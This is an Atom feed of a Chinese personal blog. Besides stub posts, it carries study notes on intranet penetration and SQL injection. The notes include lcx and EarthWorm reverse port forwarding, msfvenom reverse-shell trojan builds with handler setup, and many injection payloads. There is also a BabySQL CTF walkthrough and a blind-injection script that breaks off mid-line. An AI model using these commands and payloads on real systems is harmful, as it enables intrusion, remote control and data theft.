<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fyのblog</title>
  
  
  <link href="http://fybc.xyz/atom.xml" rel="self"/>
  
  <link href="http://fybc.xyz/"/>
  <updated>2024-04-30T08:15:18.405Z</updated>
  <id>http://fybc.xyz/</id>
  
  <author>
    <name>fy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>炒菜</title>
    <link href="http://fybc.xyz/posts/7335/"/>
    <id>http://fybc.xyz/posts/7335/</id>
    <published>2024-04-30T08:02:25.000Z</published>
    <updated>2024-04-30T08:15:18.405Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="芽菜的制作"><a href="#芽菜的制作" class="headerlink" title="芽菜的制作"></a>芽菜的制作</h1><video width="320" height="240" controls>    <source src="movie.mp4" type="https://www.fybc.xyz/movies/9ea24aaaed581e126d2eb3dbe5a70c4d.mp4"></video><p>!(C:\study\myblog\source\img\1611750008434.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;js&#92;APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://fybc.xyz/posts/16107/"/>
    <id>http://fybc.xyz/posts/16107/</id>
    <published>2023-11-08T01:46:50.351Z</published>
    <updated>2020-06-02T14:11:31.144Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;js&#92;APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="http://fybc.xyz/posts/27105/"/>
    <id>http://fybc.xyz/posts/27105/</id>
    <published>2021-01-25T13:00:39.000Z</published>
    <updated>2021-01-25T13:04:30.422Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="内网渗透工具"><a href="#内网渗透工具" class="headerlink" title="内网渗透工具"></a>内网渗透工具</h1><h2 id="lcx-端口转发"><a href="#lcx-端口转发" class="headerlink" title="lcx 端口转发"></a>lcx 端口转发</h2><p>靶机执行</p><blockquote><p>lcx.exe -slave 攻击者ip 攻击者端口号(5115) 受害者ip 受害者端口号（3389）</p></blockquote><p>攻击机执行</p><blockquote><p>监听5225端口并转发到33891上</p><p>lcx.exe -listen 5115 33891</p></blockquote><p>攻击者远程连接mstsc 127.0.0.1:33891</p><p>tip:攻击者的端口号可以随机选择，第一步是进行通信，由内网靶机来主动请求连接，从而绕过防火墙。再继续端口转发流量镜像。</p><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><ol><li>在内网做代理服务器</li><li>让外网主机利用对应工具连接代理服务器</li><li>外网所有的流量将通过代理服务器进行转发</li><li>外网去访问内网服务时，通过设置代理服务器，将数据发送到代理服务器上，代理服务器进行转发</li></ol><p>让外网主机成功访问内网</p><h2 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h2><p>正向代理</p><blockquote><p>目标主机在公网有ip地址，使用sock工具直接连接</p><p>ew -s ssocks -l 8888 //在主机上开启8888端口的sock服务</p><p>用户通过sock工具连接ip:8888端口</p></blockquote><p>反向代理</p><blockquote><p>目标主机无公网ip，有防火墙进行端口过滤，无法直接连接，进行反向连接</p><p>假设可控公网主机内网ip为1.1.1.1，可控内网主机ip为2.2.2.2</p><ol><li>在外网主机执行 ew.exe -s rcsocks -l 1080 -e 8888 </li><li>在内网主机执行 ew.exe -s rssocks -d 1.1.1.1 -e 8888</li><li>使用sock工具访问1.1.1.1：1080端口，完成反向代理</li></ol></blockquote><h3 id="sock连接"><a href="#sock连接" class="headerlink" title="sock连接"></a>sock连接</h3><h4 id="window"><a href="#window" class="headerlink" title="window"></a>window</h4><p>socksCap工具</p><ol><li>打开socksCap  管理员权限打开</li><li>配置代理（代理ip、端口、类型）</li><li>测试代理连通性，测试成功则代表可以访问代理服务器</li><li>可以将要使用的工具和服务拖入sockcap执行</li></ol><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>proxychain工具</p><ol><li><p>使用命令vim或gedit打开配置文件   <code>gedit /etc/proxychains.conf</code>    </p></li><li><p>写入 <code>socks5 192.168.10.20 45678</code>   即 ip 端口 ip是公网主机的ip，端口是进行镜像转发的端口</p></li><li><p>在命令行前加入proxychains来使用代理    如：<code>proxychain curl “www.baidu.com“</code> <code>proxychains rdesktop 10.10.10.101</code>访问内网的远程桌面</p></li></ol><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><p>Eg：ew.exe -options values</p><blockquote><p>-s : ew需要执行的功能，即指定功能</p><blockquote><ol><li><p>ssocksd  目标主机开放对应的socks服务，正向代理</p></li><li><p>rcsocks   在攻击机上执行功能，将socks端口流量进行镜像</p></li><li><p>rssocks   在受害者上执行功能，将socks流量转发给攻击者的端口</p></li><li><p>lcx_listen</p><blockquote><p>ew.exe -s lcx_listen -l 1234 -e 4567</p><p>进行监听，把4567端口流量镜像到1234端口</p></blockquote></li><li><p>lcx_tran</p></li><li><p>lcx_slave </p><blockquote><p>ew.exe -s lcx_slave -d ip -e 4567 -f ip -g 3389</p><p>将受害者3389端口转发到攻击者4567端口上</p></blockquote></li></ol></blockquote><p>-l ：需要监听的本地端口</p><p>-d ：攻击者ip</p><p>-e ：攻击者端口</p><p>-f：受害者ip</p><p>-g：受害者端口</p><p>-t：设置超时时间</p></blockquote><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>利用信息收集获得的信息，如开放端口号进行漏洞的利用</p><p>searchsploit Openssh7   // 利用kail搜索漏洞模块</p><p>msfconsole 打开msf</p><p>search xx   搜索攻击模块</p><p>use xx  使用模块，进入</p><p>show options 查看设置</p><p>set payload     //设置payload，如meterpreter</p><p>set  xx      进行设置</p><p>msf模块 </p><blockquote><p>auxiliary 功能模块、辅助模块</p><p>scanner 扫描模块</p><p>exploit 攻击模块</p><p>post 后渗透模块（提权、端口转发，为内网渗透提供便利</p><blockquote><p>Meterpreter模块</p><p>例如：ms17-010 系统权限、端口转发、后门维持、打开摄像头等等</p></blockquote><p>encoder  编码模块，进行免杀</p></blockquote><h3 id="Meterpreter模块"><a href="#Meterpreter模块" class="headerlink" title="Meterpreter模块"></a>Meterpreter模块</h3><ol><li><p>使用meterpreter攻击成功后返回一个控制通道（meterpreter通道），不使用则返回shell</p></li><li><p>控制通道可以利用命令打开shell，并且控制通道可以操作更多</p></li><li><p>主要功能</p><blockquote><p>系统信息获取</p><p>密码哈希导出</p><p>文件上传与下载</p><p>权限提升</p><p>socks代理</p><p>端口转发</p><p>日志清理</p><p>添加路由</p><p>摄像头获取</p></blockquote></li></ol><h3 id="MSF木马利用"><a href="#MSF木马利用" class="headerlink" title="MSF木马利用"></a>MSF木马利用</h3><p>得到webshell时可以使用，以此来得到meterpreter通道进行进一步的后渗透操作</p><h4 id="制作木马"><a href="#制作木马" class="headerlink" title="制作木马"></a>制作木马</h4><ol><li>kail&lt;2018 使用msfpayload</li><li>kail&gt;2018  使用msfvenom</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;4444 lhost&#x3D;192.168.10.128 --arch x64 --platform windows -f exe &gt;shell.exe</span><br><span class="line">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;公网域名 LPORT&#x3D;公网端口 R &gt;test.apk</span><br></pre></td></tr></table></figure><p>-p  payload</p><p>lport  本地端口，需要监听端口</p><p>lhost  本地ip</p><p>–arch   操作系统的架构</p><p>–platform 攻击的操作系统平台</p><p>-f   输出文件类型  -f php   -f exe  php和exe木马</p><p>&gt;shell.exe 存放到shell.exe中</p><h4 id="利用木马"><a href="#利用木马" class="headerlink" title="利用木马"></a>利用木马</h4><ol><li><p>将木马文件上传到靶机</p><p>打开Linux的网站进行上传下载</p><p>service apach2 start</p><p>service networking restart</p><p>cp shell.exe /var/www/html/</p><blockquote><p>webshell+中国菜刀</p><p>curl+weget</p><p>nc</p></blockquote></li><li><p>对木马反弹meterpreter的端口进行监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler  使用监听模块</span><br><span class="line">set payload window&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 代表监听哪个payload攻击返回回来的数据</span><br><span class="line">show options</span><br><span class="line">set lhost  设置的本地ip</span><br><span class="line">set lport   本地端口</span><br><span class="line">exploit     利用</span><br></pre></td></tr></table></figure></li><li><p>执行木马，进行反弹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;shell.exe</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;js&#92;APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://fybc.xyz/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网" scheme="http://fybc.xyz/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="工具" scheme="http://fybc.xyz/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="http://fybc.xyz/posts/13153/"/>
    <id>http://fybc.xyz/posts/13153/</id>
    <published>2020-07-02T09:38:36.000Z</published>
    <updated>2020-07-17T07:55:44.755Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="数组库基本介绍"><a href="#数组库基本介绍" class="headerlink" title="数组库基本介绍"></a>数组库基本介绍</h1><h2 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h2><ul><li>MYSQL有一个默认的内置数据库，信息数据库information_schema<blockquote><p>其中有三个重要的表，分别是schemate，tables，columns</p><blockquote><ol><li>schemate表 包含了所有数据库的名称schema_name</li><li>tables表 包含了数据库所有表 (table_schema,table_name)</li><li>columns表 包含了数据包所有的字段（table_schema,table_name,column_name)</li></ol></blockquote></blockquote></li><li>mysql内置函数<blockquote><p>user() 查看当前数据库账号的用户名<br>version() 查看当前数据库的版本<br>database() 查看当前所在查询的数据库名<br>@@datadir 查看当前数据库所在物理路径</p></blockquote></li></ul><h2 id="sqlserver数据库"><a href="#sqlserver数据库" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><h2 id="sql注入数据库判断"><a href="#sql注入数据库判断" class="headerlink" title="sql注入数据库判断"></a>sql注入数据库判断</h2><hr><h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="用到的函数"><a href="#用到的函数" class="headerlink" title="用到的函数"></a>用到的函数</h2><ul><li>union select 联合查询，每个查询必须包含相同的列</li><li>order by 判断列数</li><li>limit 0,1 //0是起始位置，1是偏移量，即从第0行开始，偏移一位，查询一行数据<br>先判断是否存在回显，然后判断列数，再使用union select 列数判断出回显的一个位置，对回显的位置进行注入</li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><blockquote><p>union select group_concat(schema_name) from information_schema.schemate //查询所有的数据库<br>union selectt group_concat(table_name) from information_schame.tables where table_schema=database()   //查询当前数据库所有的表名<br>union select group_concat(cloumn_name) from information_schema.columns<br>where table_schema=database() and table_name=’users’ //查询当前数据库users表中所有的字段<br>union select group_concat(concat_ws(‘:’,username,password)) from users<br>//查询users表中的数据使用concat_ws拼接两个字段的数据 </p></blockquote><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a><em>[极客大挑战 2019]BabySQL</em></h3><p><img src="/img/babysql1.PNG" alt=""></p><ul><li>进行网址后，发现是登录界面，根据题目猜测存在sql注入，先尝试进行常规操作<blockquote><p>username=admin&amp;password=12’or 1=1%23</p></blockquote></li></ul><p><img src="/img/babysql2.PNG" alt=""><br>这里返回了‘1=1#’错误，说明or是被过滤了，尝试双写绕过<br>使用oorr来绕过replace</p><blockquote><p>username=admin&amp;password=12’oorr 1=1%23</p></blockquote><p><img src="/img/babysql3.PNG" alt=""></p><ul><li><p>页面成功回显了，再使用order by判断列数</p></li><li><p>这里经过测试后，发现order by，from，for都被过滤了，需要双写</p></li><li><p>order by 3时正常，order by4时报错，猜测有3列</p><blockquote><p>username=admin&amp;password=12’ oorrder bbyy 4%23</p></blockquote></li></ul><p><img src="/img/babysql4.PNG" alt=""></p><ul><li>再使用union select 1,2,3来判断回显位置。因为union select被过滤了，需要双写<blockquote><p>username=admin&amp;password=12’ ununionion seselectlect 1,2,3%23</p></blockquote></li></ul><p><img src="/img/babysql5.PNG" alt=""></p><ul><li><p>成功回显了2，3，即下一步就是在2，3的位置进行操作</p></li><li><p>下一步就是判断当前数据库，和所有的数据库名称,同样要进行双写</p><blockquote><p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),group_concat(schema_name) frofromm infoorrmation_schema.schemata%23</p></blockquote></li></ul><p><img src="/img/babysql6.PNG" alt=""></p><ul><li>成功返回当前数据库为geek，有test,ctf,geek三个自建数据库，猜测flag在ctf数据库中。然后就是得到ctf数据库的表名<blockquote><p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),group_concat(table_name) frofromm infoorrmation_schema.tables whewherere table_schema=’ctf’%23</p></blockquote></li></ul><p><img src="/img/babysql7.PNG" alt=""></p><ul><li>得到数据库一个表名Flag，再判断表名中的字段<blockquote><p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),group_concat(column_name) frofromm infoorrmation_schema.columns whewherere table_schema=’ctf’ anandd table_name=’Flag’%23</p></blockquote></li></ul><p><img src="/img/babysql8.PNG" alt=""></p><ul><li>得到一个字段flag，查看字段数据</li></ul><blockquote><p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),flag frfromom ctf.Flag%23</p></blockquote><p><img src="/img/babysql9.PNG" alt=""></p><ul><li>数据在ctf的Flag表中，成功得到flag</li></ul><h2 id="sqlserver数据库-1"><a href="#sqlserver数据库-1" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="oracle数据库"><a href="#oracle数据库" class="headerlink" title="oracle数据库"></a>oracle数据库</h2><hr><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>当前的查询存在一个报错的时候可以尝试使用报错注入，可以和union一起使用，当union select<br>被过滤的情况下可以考虑使用报错注入，报错注入是人为的制造错误，使查询语句能够出现在错误信息中</p><h2 id="Xpath语法错误"><a href="#Xpath语法错误" class="headerlink" title="Xpath语法错误"></a>Xpath语法错误</h2><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><ul><li>函数原型：extractvalue(xml_document,Xpath_string)<blockquote><p>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p></blockquote></li></ul><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><blockquote><p>id=1’ and extractvalue(1,concat(0x7e,(select version())))<br>//查询版本号<br>id=1’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())))<br>//查询当前数据库的表</p></blockquote><h3 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h3><ul><li>函数原型：updatexml(xml_document,xpath_string,new_value)<blockquote><p>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值<br>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同</p></blockquote></li></ul><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><blockquote><p>id=1’and updatexml(1,concat(0x7e,(select version())),1)</p></blockquote><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>使用 extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li><li>0x7e就是’~‘,可以换成’#’、’$’等不满足xpath格式的字符</li></ol><h2 id="floor与group-by报错"><a href="#floor与group-by报错" class="headerlink" title="floor与group by报错"></a>floor与group by报错</h2><h3 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h3><blockquote><p>rand() 表示0-1的随机值<br>floor（） 向下取整<br>count() 统计行数<br>group up 分组 字段是唯一的，是主键<br>floor(rand(0))*2会生成随机的0或1</p></blockquote><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><blockquote><p>id=admin’ union select 1,count(1) from information_schema.tables group by concat(foloor(rand()*2),database())#  //查看数据库版本<br>‘union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a–+<br>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)–+</p></blockquote><h2 id="整形溢出报错注入"><a href="#整形溢出报错注入" class="headerlink" title="整形溢出报错注入"></a>整形溢出报错注入</h2><ul><li>exp(x) 数学函数 返回值 e (自然对数的底) 的 x 次方</li></ul><h3 id="报错payload"><a href="#报错payload" class="headerlink" title="报错payload"></a>报错payload</h3><blockquote><p>and exp(~(select * from(select user())a));</p></blockquote><h2 id="几何函数报错注入"><a href="#几何函数报错注入" class="headerlink" title="几何函数报错注入"></a>几何函数报错注入</h2><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>geometrycollection()<br>multipoint()<br>polygon()<br>multipolygon()<br>linestring()<br>multilinestring()</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><blockquote><p>and geometrycollection((select * from(select * from(select user())a)b));<br>and multipoint((select * from(select * from(select user())a)b))<br>and polygon((select * from(select * from(select user())a)b))<br>and multipolygon((select * from(select * from(select user())a)b))<br>and linestring((select * from(select * from(select user())a)b))<br>and multilinestring((select * from(select * from(select user())a)b))</p></blockquote><ul><li>函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错,但是，上述函数经本地测试，本地高版本MySQL无法得到数据（5.6.22）</li></ul><h2 id="列名重复报错注入"><a href="#列名重复报错注入" class="headerlink" title="列名重复报错注入"></a>列名重复报错注入</h2><ul><li>name_const()函数　</li><li>name_const(name,value)函数会用传入的参数返回一列结果集.传入的参数必须是常量，如果不是则报错,修改name使之报错<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><blockquote><p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;<br>因为两列列名相同,外面选择时候报错,说重复列，暂时只能用version（）</p></blockquote></li></ul><h2 id="sqlserver数据库-2"><a href="#sqlserver数据库-2" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="Oracle数据库-1"><a href="#Oracle数据库-1" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><hr><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><ul><li>看不见数据库的报错，看不见数据库返回的数据，通过页面状态变换来判断字符的数据</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><blockquote><p>substr() 截取参数，有三个参数，第一个是要截取的字符串，第二个是截取字符串的起始位置，第三个是规定要返回的字符串长度。默认是直到字符串的结尾。</p><blockquote><p>substr(xx from 32)  //如果为32位。相当于取第32位，from 1 就是从第一位到最后一位<br>substr(xx from 31)  //from 31 相当于取从31到32两位，这时只能使用字符串比较，而不能使用ascii</p><blockquote><p>substr(xx from 1 for 1) 从一开始，截取一个=substr(xx,1,1)<br>+可以搭配substr使用，用’0’来闭合</p></blockquote></blockquote></blockquote><blockquote><p>length() 判断长度</p></blockquote><h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><blockquote><p>?id=-1’ or (select substr(version(),1,1 )=’5’)#  //截取version的第一个字符与AScii码做比较，如果为真则页面返回正常，如果为假则返回错误，一个个进行比较来查看<br>?id=-1’ or (select substr(table_name,2,1) from information_schema.tables<br>where table_schema=database() limit 0,1)=’m’#  //查询当前数据库的第一个表的第二个字符是否等于m，是则页面正常，limit来控制列数，substr来控制列的第几个字符<br>?id=-1’ or (select ascii(substr(table_name,1,1)) from information_schema.tables<br>where table_schema=database() limit 0,1)=101%23  //把里面字符转为ASCII码，在比较128位ascii码与字符是否相等</p></blockquote><ul><li>使用二分法来快速查找，先是之是否大于64，一步步比较</li></ul><h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line"># 获取数据库名长度</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">        url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php&#39;&#39;&#39;</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and length(database())&gt;%s&#39;&#39;&#39; % i</span><br><span class="line">        # print(url+payload+&#39;%23&#39;)</span><br><span class="line">        r &#x3D; requests.get(url + payload + &#39;%23&#39;)</span><br><span class="line">        if &#39;You are in&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            # print(&#39;false&#39;)</span><br><span class="line">            print(&#39;database_length:&#39;, i)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_len()</span><br><span class="line"></span><br><span class="line">#获取数据库名</span><br><span class="line">def database_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 9):</span><br><span class="line">        for i in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr(database(),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            # print(url+&#39;%23&#39;)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;database_name:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name()</span><br><span class="line"></span><br><span class="line"># 获取数据库表</span><br><span class="line">def tables_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 30):</span><br><span class="line">        for i in &#39;abcdefghijklmnopqrstuvwxyz,&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select 